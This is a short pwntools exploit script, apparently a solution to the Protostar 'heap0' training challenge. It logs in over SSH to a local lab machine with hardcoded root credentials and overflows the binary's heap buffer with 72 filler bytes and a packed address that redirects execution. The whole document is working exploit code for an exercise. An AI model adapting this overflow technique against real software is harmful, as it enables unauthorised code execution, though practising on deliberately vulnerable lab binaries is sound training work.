from pwn import *

sh = ssh(host='192.168.1.104', user='root',
                password='godmode', port=22)
cmd = sh.set_working_directory('/opt/protostar/bin')

payload = "A"*72 + pack(0x8048464)
print payload
print sh.run(['./heap0', payload]).recvall().strip()
